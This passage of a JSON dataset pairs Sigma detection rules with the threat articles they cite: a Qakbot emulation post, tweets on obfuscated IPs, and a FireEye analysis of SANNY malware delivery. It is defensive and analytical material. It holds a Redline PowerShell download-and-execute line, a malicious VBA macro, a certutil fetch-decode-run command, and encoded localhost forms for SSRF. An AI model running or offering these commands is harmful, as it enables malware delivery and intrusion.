SUCCESS    Image Base: 0x752...\n  1:04:32.6193266 PM    calc.exe    10192    Load Image    C:\\Windows\\SysWOW64\\oleaut32.dll    SUCCESS    Image Base: 0x769...\n  1:04:32.6200812 PM    calc.exe    10192    Load Image    C:\\Windows\\SysWOW64\\winmm.dll    SUCCESS    Image Base: 0x731...\n  1:04:32.6230962 PM    calc.exe    10192    Load Image    C:\\Windows\\WinSxS\\x86_microsoft.win32...    SUCCESS    Image Base: 0x731...\n  1:04:32.6231032 PM    calc.exe    10192    Load Image    C:\\Windows\\SysWOW64\\uxTheme.dll    SUCCESS    Image Base: 0x745...\n  1:04:32.6241173 PM    calc.exe    10192    Load Image    C:\\Windows\\SysWOW64\\version.dll    SUCCESS    Image Base: 0x755...\n  1:04:32.6383783 PM    calc.exe    10192    Load Image    C:\\Windows\\SysWOW64\\mmc.dll    SUCCESS    Image Base: 0x745...\n  1:04:32.6767274 PM    calc.exe    10192    Load Image    E:\\WindowsCodecs.dll    SUCCESS    Image Base: 0x746...\n  1:04:32.6818910 PM    calc.exe    10192    Load Image    C:\\Windows\\SysWOW64\\vcruntime140.dll    SUCCESS    Image Base: 0x746...\n```\n\nThe `regsvr32.exe` command is used to register components with the system. This should never be executed by `calc.exe`, regardless of where `calc.exe` is executing from. Process relationships can be examined via Sysmon event ID 1 and Security event ID 4688 (when configured).\n\n```image\nAlt: Process Relationships\nDescription: The image displays a screenshot from a process monitoring tool, showing a log of process creation events. Each entry lists the time, process name, process ID (PID), and the command that initiated the process. Notably, `calc.exe` is executed from a non-standard location (E: drive), and there is a suspicious instance of `regsvr32.exe` being invoked by `calc.exe`. This highlights potential malicious activity related to DLL sideloading, which is relevant for detecting threats like Qakbot.\nTranscription: |\n  1:04:32.0535178 PM    not-for-detections.exe    9540    Process Create    C:\\Windows\\SysWOW64\\cmd.exe    SUCCESS    PID: 4220, Command:\n  1:04:32.0945295 PM    cmd.exe                   4220    Process Create    C:\\Windows\\System32\\Conhost.exe    SUCCESS    PID: 7232, Command:\n  1:04:32.5567348 PM    cmd.exe                   4220    Process Create    E:\\calc.exe    SUCCESS    PID: 10192, Command:\n  1:04:32.6969044 PM    calc.exe                  10192   Process Create    C:\\Windows\\SysWOW64\\regsvr32.exe    SUCCESS    PID: 7024, Command:\n  1:04:32.9383411 PM    services.exe              688     Process Create    C:\\Windows\\System32\\svchost.exe    SUCCESS    PID: 8932, Command:\n```\n\nMost system commands are not executed from `C:\\windows\\syswow64` (as they will be if you execute this emulation using the x86 SCYTHE client). Alerting on commands such as `whoami.exe` or `ipconfig` running from `C:\\windows\\syswow64` can provide early detection of x86 malware calling system commands, though this may have high false positive ratings. These can be detected through Sysmon event ID 1 and Security event ID 4688 (when configured).\n\n```image\nAlt: Syswow64 Commands\nDescription: The image displays a screenshot of a Process Monitor (Procmon) output, which logs various process creation events. Each entry shows the time, process name (e.g., 'q7_scythe_client32.exe', 'cmd.exe', 'whoami.exe'), and the path from which these processes were executed, specifically from the 'C:\\Windows\\SysWOW64\\' directory. This output is relevant for analyzing potential security threats, particularly in detecting anomalous processes that could indicate malware activity.\nTranscription: |\n  1:04:44.9590654 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\whoami.exe\n  1:04:50.1842800 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\cmd.exe\n  1:05:00.6308969 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\ipconfig.exe\n  1:05:05.8428511 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\arp.exe\n  1:05:11.0863956 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\net.exe\n  1:05:27.2455117 PM    net.exe                   1004    Process Create    C:\\Windows\\SysWOW64\\net.exe\n  1:05:47.5331952 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\route.exe\n  1:05:58.1607439 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\netstat.exe\n  1:06:03.1963091 PM    q7_scythe_client32.exe    9764    Process Create    C:\\Windows\\SysWOW64\\cmd.exe\n```\n\n### Sigma Detection Opportunities\n\nBelow are the Sigma rules applicable to the procedures carried out in the emulation plan. If any of the procedures covered in this section do not trigger an alert in the environment, it is recommended to deploy the relevant rule. Note, as with many Sigma rules, this set of rules may need to be baselined for your unique environment and filters added for approved activity by certain users, systems, or applications.\n\n#### Suspicious Calculator Execution\n\nThe first coverage provided by Sigma is to detect suspicious activity around the calculator application. To detect this, the first rule, Suspicious Process Parents, looks for uncommon processes being spawned by `calc.exe`. The next detection opportunity in this execution phase is the Suspicious Calculator Usage rule which looks for `calc.exe` coming from suspicious directories such as a mounted ISO.\n\n#### Whoami\n\nThe first action on objective procedure mapped to Sigma is in step eleven of the emulation plan.\n\n```image\nAlt: Whoami Execution\nDescription: The image depicts a screenshot or diagram related to the execution of the command 'whoami /all' in a cybersecurity context. It appears to be part of a step-by-step threat emulation plan, specifically indicated as step eleven. There are also references to two specific techniques (T1059.003 and T1033) associated with this action, likely linking to the MITRE ATT&CK framework. The layout suggests a structured approach to monitoring or detecting the execution of this command within a system.\nTranscription: |\n  11\n  run whoami /all\n  T1059.003\n  T1033\n```\n\nIn this step, the `whoami` execution maps to the following three Sigma rules:\n- Local Accounts Discovery\n- Whoami Execution\n- Whoami Execution Anomaly\n\n#### Suspicious Network Commands\n\nThe next detection opportunities are presented in steps thirteen, fourteen, and seventeen conducting network enumeration as pictured below.\n\n```image\nAlt: Network Enumeration\nDescription: The image shows a sequence of commands related to network enumeration, specifically 'arp -a' and 'ipconfig /all'. These commands are linked to the tactics T1059.003 and T1590.005, indicating their relevance to suspicious network activities. The layout presents a structured approach to identifying potential threats, likely as part of a threat emulation or detection strategy.\nTranscription: |\n  13\n  run arp -a\n  T1059.003\n  T1590.005\n  \n  14\n  run ipconfig /all\n  T1059.003\n  T1590.005\n```\n\n```image\nAlt: Network Enumeration\nDescription: The image depicts a flowchart or step diagram highlighting a specific command, 'run route print', associated with network enumeration. It includes step number '17' and references two specific tactics (T1059.003 and T1590.004) that are applicable to this command. The layout suggests a structured approach to documenting detection opportunities related to suspicious network commands, relevant to threat emulation for Qakbot.\nTranscription: |\n  17\n  run route print\n  T1059.003\n  T1590.004\n```\n\nAll of these network enumeration steps map to the Suspicious Network Command Sigma Rule.\n\n#### Net Command\n\nContinuing enumeration procedures takes us to our next set of detection opportunities around `net` command usage and its related applications, `net.exe` and `net1.exe`. It is in steps fifteen, sixteen, and nineteen of the emulation, the `net` command is used.\n\n```image\nAlt: Net Command\nDescription: The image depicts a series of steps from a threat emulation process focusing on the usage of the `net` command, specifically `net view /all` and `net share`. Each step is numbered, with step fifteen showing the command along with corresponding MITRE ATT&CK techniques (T1059.003, T1590, T1135) indicated in a structured format. This structured presentation of commands and their context is relevant for threat detection and response.\nTranscription: |\n  15\n  run net view /all\n  T1059.003  T1590  T1135\n  \n  16\n  run net share\n  T1059.003  T1135\n```\n\n```image\nAlt: Net Command\nDescription: The image depicts a flowchart or step sequence related to the execution of the `net localgroup` command, which is part of a threat emulation process for Qakbot. It includes a step number (19) and references to specific techniques (T1059.003 and T1069.001), indicating their association with the command. This visual aids in understanding the procedural aspect of the threat emulation, particularly focusing on detection opportunities related to the `net` command usage.\nTranscription: |\n  19\n  run net localgroup\n  T1059.003\n  T1069.001\n```\n\nHere we find that the Net.exe Execution Sigma rule applies to the three procedures due to their command parameters. Step fifteen will also trigger a second rule, Windows Network Enumeration.\n\n#### Netstat\n\nThe final Sigma detection opportunity is the usage of `netstat` in step eighteen.\n\n```image\nAlt: Netstat\nDescription: The image shows a flowchart or step-by-step guide indicating a specific action, labeled step eighteen, which involves executing the command 'run netstat -nao'. It also includes references to three techniques identified by their respective IDs: T1059.003, T1046, and T1057, which are likely related to threat detection methods associated with network connections.\nTranscription: |\n  18 run netstat -nao\n  T1059.003 T1046 T1057\n```\n\nFor this procedure, the applicable Sigma rule is Suspicious Listing of Network Connections.\n\n## Respond\n\nIf any of the alerts are detected in the environment, the response team should determine the depth of the Kill Chain, collect artifacts, and answer the following questions:\n\n- Was the installation successful?\n  - What are the persistent mechanisms?\n- Is Command & Control (C2) successful?\n  - What are the domain names, IP addresses, ports, and protocols used?\n- Are there observations of Actions on Objectives (AOO)?\n  - What are they?\n  - Did the actor laterally move?\n  - Was sensitive data taken?\n    - Usernames, Passwords, Other?\n- What caused the initial compromise?\n  - How was it delivered?\n  - What was exploited?\n    - Vulnerability, Control, Human?\n\nOnce it has been determined how deep the intrusion goes, containment, eradication, and recovery should begin. After recovery, lessons learned should drive additional courses of action (COAs) to thwart the threat should it return, such as implementing additional security controls. As always, please follow your organization's response plan and evidence retention policies. We also recommend leveraging NIST SP 800-61 Rev. 2.\n\n*This Threat Thursday post discusses active research by SCYTHE and other cited third parties into an ongoing threat. The information in this post should be considered preliminary and may be updated as research continues. This information is provided “as-is” without any warranty or condition of any kind, either express or implied.*\n\n## References\n\n- New Variant of QakBot Being Spread by HTML File Attached to Phishing Emails (fortinet.com)\n- Technical analysis of the QakBot banking Trojan | Securelist\n- A closer look at Qakbot’s latest building blocks (and how to knock them down) - Microsoft Security Blog\n- QAKBOT Loader Returns With New Techniques and Tools (trendmicro.com)",
    "sigma_rule": {
      "title": "LOLBIN Execution From Abnormal Drive",
      "id": "d4ca7c59-e9e4-42d8-bf57-91a776efcb87",
      "related": [
        {
          "id": "5b80cf53-3a46-4adc-960b-05ec19348d74",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects LOLBINs executing from an abnormal or uncommon drive such as a mounted ISO.",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
        "https://www.scythe.io/library/threat-emulation-qakbot",
        "https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/"
      ],
      "author": "Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Angelo Violetti - SEC Consult '@angelo_violetti', Aaron Herman",
      "date": "2022-01-25",
      "modified": "2023-08-29",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\calc.exe",
              "\\certutil.exe",
              "\\cmstp.exe",
              "\\cscript.exe",
              "\\installutil.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "OriginalFileName": [
              "CALC.EXE",
              "CertUtil.exe",
              "CMSTP.EXE",
              "cscript.exe",
              "installutil.exe",
              "MSHTA.EXE",
              "REGSVR32.EXE",
              "RUNDLL32.EXE",
              "wscript.exe"
            ]
          }
        ],
        "filter_main_currentdirectory": {
          "CurrentDirectory|contains": "C:\\"
        },
        "filter_main_empty": {
          "CurrentDirectory": ""
        },
        "filter_main_null": {
          "CurrentDirectory": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rare false positives could occur on servers with multiple drives."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml",
    "id": "546"
  },
  {
    "url": "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
    "markdown": "# Post\n\nJul 31, 2022\n\nUse this site to convert your IP while testing on #ssrf\nhttps://h.43z.one/ipconverter/\n\n#SSRF\n\n```image\nDescription: The image displays a web interface for an IP address conversion tool, specifically showcasing the loopback IP address '127.0.0.1'. The interface includes a text input field where the IP address can be entered along with a 'convert' button. Below the input field, a list of various representations of the IP address is shown, including hexadecimal and decimal formats. The bottom of the image indicates that the tool is created by a user identified as 'h43z'.\nTranscription: |\n  127.0.0.1\n  convert\n  http://127.0.0.1\n  http://127.1\n  http://2137076433\n  http://0x7f.0x0.0x0.1\n  http://0xf000001\n  http://0x7f.0x000001\n  http://0x7f.0x0.0x0001\n  http://017.0.0.01\n  http://017.000000000000.0000001\n  http://01770000001\n  http://s%13%32%37%2e%30%2e%30%2e%31\n  http://127.0.00000000.0x1\n  http://0.0.0.0\n  created by h43z\n```",
    "sigma_rule": {
      "title": "Obfuscated IP Download Activity",
      "id": "cb5a2333-56cf-4562-8fcb-22ba1bca728d",
      "status": "test",
      "description": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
        "https://twitter.com/fr0s7_/status/1712780207105404948"
      ],
      "author": "Florian Roth (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_command": {
          "CommandLine|contains": [
            "Invoke-WebRequest",
            "iwr ",
            "wget ",
            "curl ",
            "DownloadFile",
            "DownloadString"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_command and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_download.yml",
    "id": "549"
  },
  {
    "url": "https://twitter.com/fr0s7_/status/1712780207105404948",
    "markdown": "# Post\n\nOct 13, 2023\n\nNice try #Redline trying to Obfuscate IP's into hex\n\n```image\nDescription: The image displays a command line interface output, showcasing a series of Windows command line instructions. The highlighted section in red reveals a URL formatted in hexadecimal, which is likely part of a script or command that downloads content from the specified address. The context implies a discussion about the obfuscation techniques used by a malware variant named Redline, particularly in how it conceals IP addresses.\nTranscription: |\n  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  ..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\n  mkdir C:\\a;(iwr 'http://0x59176032:7777/c.txt' -OutFile 'C:\\a\\c.txt').Content;$c=gc \"C:\\a\\c.txt\";gc C:\\a\\c.txt | % {iex $_}\n  C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\n  desktop=vsn6isd\n```",
    "sigma_rule": {
      "title": "Obfuscated IP Download Activity",
      "id": "cb5a2333-56cf-4562-8fcb-22ba1bca728d",
      "status": "test",
      "description": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
        "https://twitter.com/fr0s7_/status/1712780207105404948"
      ],
      "author": "Florian Roth (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_command": {
          "CommandLine|contains": [
            "Invoke-WebRequest",
            "iwr ",
            "wget ",
            "curl ",
            "DownloadFile",
            "DownloadString"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_command and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_download.yml",
    "id": "550"
  },
  {
    "url": "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608",
    "markdown": "# Post\n\nJul 31, 2022\n\nUse this site to convert your IP while testing on #ssrf\nhttps://h.43z.one/ipconverter/\n\n#SSRF\n\n```image\nDescription: The image displays a web interface for an IP address conversion tool, specifically showcasing the loopback IP address '127.0.0.1'. The interface includes a text input field where the IP address can be entered along with a 'convert' button. Below the input field, a list of various representations of the IP address is shown, including hexadecimal and decimal formats. The bottom of the image indicates that the tool is created by a user identified as 'h43z'.\nTranscription: |\n  127.0.0.1\n  convert\n  http://127.0.0.1\n  http://127.1\n  http://2137076433\n  http://0x7f.0x0.0x0.1\n  http://0xf000001\n  http://0x7f.0x000001\n  http://0x7f.0x0.0x0001\n  http://017.0.0.01\n  http://017.000000000000.0000001\n  http://01770000001\n  http://s%13%32%37%2e%30%2e%30%2e%31\n  http://127.0.00000000.0x1\n  http://0.0.0.0\n  created by h43z\n```",
    "sigma_rule": {
      "title": "Obfuscated IP Via CLI",
      "id": "56d19cb4-6414-4769-9644-1ed35ffbb148",
      "status": "test",
      "description": "Detects usage of an encoded/obfuscated version of an IP address (hex, octal, etc.) via command line",
      "references": [
        "https://h.43z.one/ipconverter/",
        "https://web.archive.org/web/20220801074831/https://twitter.com/Yasser_Elsnbary/status/1553804135354564608"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2022-08-03",
      "modified": "2023-11-06",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": [
            "\\ping.exe",
            "\\arp.exe"
          ]
        },
        "selection_ip_1": {
          "CommandLine|contains": [
            " 0x",
            "//0x",
            ".0x",
            ".00x"
          ]
        },
        "selection_ip_2": {
          "CommandLine|contains|all": [
            "http://%",
            "%2e"
          ]
        },
        "selection_ip_3": [
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.[0-9]{1,3}\\.0[0-9]{3,4}"
          },
          {
            "CommandLine|re": "https?://[0-9]{1,3}\\.0[0-9]{3,7}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{3,11}"
          },
          {
            "CommandLine|re": "https?://(0[0-9]{1,11}\\.){3}0[0-9]{1,11}"
          },
          {
            "CommandLine|re": "https?://0[0-9]{1,11}"
          },
          {
            "CommandLine|re": " [0-7]{7,13}"
          }
        ],
        "filter_main_valid_ip": {
          "CommandLine|re": "https?://((25[0-5]|(2[0-4]|1\\d|[1-9])?\\d)(\\.|\\b)){4}"
        },
        "condition": "selection_img and 1 of selection_ip_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_obfuscated_ip_via_cli.yml",
    "id": "552"
  },
  {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks\n\n**March 23, 2018** \n\n### Introduction\n\nIn the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian.\n\nAs part of these recently observed attacks, the threat actor has made significant changes to their usual malware delivery method. The attack is now carried out in multiple stages, with each stage being downloaded from the attacker’s server. Command line evasion techniques, the capability to infect systems running Windows 10, and use of recent User Account Control (UAC) bypass techniques have also been added.\n\n### Document Details\n\nThe following two documents, detailed below, have been observed in the latest round of attacks:\n\n- **MD5 hash:** c538b2b2628bba25d68ad601e00ad150 \n  **SHA256 hash:** b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 \n  **Original Filename:** РГНФ 2018-2019.doc\n\n  ```image\n  Alt: Figure 1: Sample document written in Russian\n  Description: The image shows a document written in Russian, titled \"Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект\" (Deepening the Eurasian Geopolitics of China and the Security Interests of Russia: Transport Aspect). It contains sections detailing project information, including project type, knowledge area, classification code, project name, project manager's details, financial information, and keywords. The layout appears to be a formal document, typical of project proposals or scientific research summaries.\n  Transcription: |\n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.\n    \n    Тип проекта: а  \n    Область знания: 07  \n    Код классификатора РГНФ: 07-140  \n    Код ГРНТИ: 73.01.17  \n    Приоритетное направление развития науки, технологий и техники в Российской Федерации, критические технологии]  \n    7. Транспортные и космические системы.\n    \n    Фамилия, имя, отчество руководителя проекта:  \n    Аристова Людмила Борисовна  \n    Телефон руководителя проекта: +7 9858269051  \n    Объем финансирования проекта  \n    на 2017 г.: 500 000 (пятьсот тысяч) рублей  \n    Год начала проекта 2018  \n    Год окончания проекта 2019  \n    Фамилии, имена, отчества основных исполнителей Семенова Н.К.\n    \n    Название проекта  \n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.  \n    Тип проекта  \n    а - проект проведения научных исследований, выполняемый научным коллективом или отдельным ученым  \n    Область знания 07  \n    Код классификатора 07-140  \n    Дополнительные коды классификатора (при наличии приводятся дополнительные коды классификатора, к которым может быть отнесен проект) 07-110  \n    \n    Ключевые слова (приводится не более 15 слов)  \n    Экономический пояс Шелкового пути, интересы безопасности РФ, Евразийский экономический союз, интеграция, регионального уровня, перспективы, риски\n  ```\n \n  *Figure 1: Sample document written in Russian*\n\n- **MD5 hash:** 7b0f14d8cd370625aeb8a6af66af28ac \n  **SHA256 hash:** e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 \n  **Original Filename:** Copy of communication from Security Council Committee (1718).doc\n\n  ```image\n  Alt: Figure 2: Sample document written in English\n  Description: The image displays a document that appears to be a formal letter, likely issued by a committee related to the Security Council. The content includes a header with postal and cable addresses, as well as a reference date of December 8, 2017. The letter discusses humanitarian operations in the Democratic People's Republic of Korea (DPRK) and addresses the unintended consequences of sanctions. Key points of the letter are redacted, indicating sensitive information. Overall, the document serves as an example of a communication that may be associated with the SANNY malware delivery method.\n  Transcription: |\n    POSTAL ADDRESS - ADRESSE POSTALE: <redacted>\n    \n    CABLE ADDRESS - ADRESSE TELEGRAPHIQUE: <redacted>\n    \n    REFERENCE: <redacted> 8 December 2017\n    \n    Dear <redacted>\n    \n    On behalf of the Security Council Committee established pursuant to resolution 1718 (2006), I have the honour to refer to your letter dated 27 October 2017 on the unintended consequences of sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK).\n    \n    The Committee has examined the information contained in your letter and its enclosures, as well as your request for a formal communication from the Committee to all concerned parties reiterating that humanitarian activities are exempt from sanctions. In this regard, I wish to recall that the 1718 Committee has provided exemptions in the past for humanitarian projects, as well as its approval for many other United Nations activities the Committee was consulted on.\n    \n    Similarly, the Committee stands ready to offer its assistance in clarifying to all UN Member States that the sanctions measures imposed by the Security Council resolutions on the DPRK are not intended to have a negative impact on the people of the DPRK.\n  ```\n\n  *Figure 2: Sample document written in English*\n\n### Macro Analysis\n\nIn both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line.\n\n```image\nAlt: Macro Code\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code that demonstrates a macro used in malware delivery. The code retrieves the Windows directory, checks the application path for 'x86', and constructs a command line to execute. It utilizes a TextBox property (TextBox1.Text) to store the command to be executed, which is then run silently (vbHide) and subsequently erases the command from the TextBox to cover its tracks. This code effectively illustrates the method employed by the SANNY malware in recent attacks.\nTranscription: |\n  vb\n  sCmdLine = Environ(\"windir\")\n  nResult = InStr(Application.Path, \"x86\")\n  If nResult <> 0 Then\n      sCmdLine = sCmdLine + \"\\sysnative\\cmd.exe /q /c \"\n  Else\n      sCmdLine = sCmdLine + \"\\system32\\cmd.exe /q /c \"\n  End If\n  \n  sCmdLine = sCmdLine + TextBox1.Text\n  nResult = Shell(sCmdLine, vbHide)\n  TextBox1.Text = \"\"\n  ActiveDocument.Save\n```\n\n### Stage 1: BAT File Download\n\nIn Stage 1, the macro leverages the legitimate Microsoft Windows `certutil.exe` utility to download an encoded Windows Batch (BAT) file from the following URL: `http://more.1apps[.]com/1.txt`. The macro then decodes the encoded file and drops it in the `%temp%` directory with the name: `1.bat`.\n\n```image\nAlt: Stage 1 Code\nDescription: The image displays a command line snippet showing the execution of a BAT file download and decoding process using the Microsoft Windows `certutil.exe` utility. It outlines a series of commands where `certutil.exe` is copied to a temporary directory and executed to download an encoded BAT file from a specified URL. The command also includes steps for decoding the file and deleting the original text file after extraction.\nTranscription: |\n  C:\\Windows\\system32\\cmd.exe /q /c copy /Y\n  %windir%\\System32\\certutil.exe %TEMP%\\ct.exe && cd /d\n  %TEMP% && ct -urlcache -split -f\n  http://more.1apps.com/1.txt && ct -decode -f 1.txt\n  1.bat && del /f /q 1.txt && 1.bat\n```\n\nThere were a few interesting observations in the command line:\n\n1. The macro copies the Microsoft Windows `certutil.exe` utility to the `%temp%` directory with the name: `ct.exe`. One of the reasons for this is to evade detection by security products. Recently, FireEye has observed other threat actors using `certutil.exe` for malicious purposes. By renaming `certutil.exe` before execution, the malware authors are attempting to evade simple file-name based heuristic detections.\n2. The malicious BAT file is stored as the contents of a fake PEM encoded SSL certificate (with the BEGIN and END markers) on the Stage 1 URL, as shown in Figure 3. The `certutil.exe` utility is then leveraged to both strip the BEGIN/END markers and decode the Base64 contents of the file. FireEye has not previously observed the malware authors use this technique in past campaigns.\n\n```image\nAlt: Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate\nDescription: The image depicts a text-based representation of a malicious BAT file, formatted to resemble a PEM encoded SSL certificate. It includes the markers 'BEGIN CERTIFICATE' and 'END CERTIFICATE', with the encoded content in between. This format is used to disguise the BAT file to evade detection, and is part of a cyber attack strategy involving the SANNY malware.\nTranscription: |\n  -----BEGIN CERTIFICATE-----\n  QGVjaG9pb2ZmQ0NlcmIxIG5vdCBleGlzdCBleGlzdCB0aGVJVSBTdG9QS1UgSUxFUyh4ODYpJSIg\n  KA0KCWh0dCI6ICJjYWNoZSAtd3d3Lm9hcGVuLm9yZyBtb3RoZXIgYmluZGluZyBhcHBsaWNhdGlv\n  bnMgYnVnLC4gICBidWcgYWNjaGVzIGJla2F1c2UgdGhleSBhcmUgY29tcGxleCBhbmQgdGhleSBh\n  cmUgYm91bmQgdG8gZnJlcXVlbnQgdXBkYXRlcy4gICBIZXJlIGlzIGFuIGV4YW1wbGUgb2YgYSBz\n  aW1wbGUgY2VydGlmaWNhdGUgdGhhdCBjb3VsZCBiZSB1c2VkIGZvciBhIGJyb3dzZXIgcGx1Z2lu\n  ...\n```\n\n*Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate*\n\n### BAT File Analysis\n\nOnce decoded and executed, the BAT file from Stage 1 will download an encoded CAB file from the base URL: `hxxp://more.1apps[.]com/`. The exact file name downloaded is based on the architecture of the operating system.\n\n- For a 32-bit operating system: `hxxp://more.1apps[.]com/2.txt`\n- For a 64-bit operating system: `hxxp://more.1apps[.]com/3.txt`\n\nSimilarly, based on Windows operating system version and architecture, the CAB file is installed using different techniques. For Windows 10, the BAT file uses `rundll32` to invoke the appropriate function from `update.dll` (component inside `setup.cab`).\n\n- For a 32-bit operating system: `rundll32 update.dll _EntryPoint@16`\n- For a 64-bit operating system: `rundll32 update.dll EntryPoint`\n\nFor other versions of Windows, the CAB file is extracted using the legitimate Windows Update Standalone Installer (`wusa.exe`) directly into the system directory:\n\n```image\nAlt: CAB File Installation Code\nDescription: |\n  The image depicts a snippet of code related to the installation of a CAB file using the Windows Update Standalone Installer (wusa.exe). It includes commands for quiet extraction of the CAB file, deletion of the setup file, and other command-line instructions, which are part of a malware delivery method associated with SANNY malware. The specific commands shown are \n  - 'wusa setup.cab /quiet /extract:%windir%\\System32 > nul' \n  - 'del /f /q setup.cab > nul' \n  - 'cliconfg' \n  - 'goto EXIT'.\nTranscription: |\n  plaintext\n  wusa setup.cab /quiet /extract:%windir%\\System32 > nul\n  del /f /q setup.cab 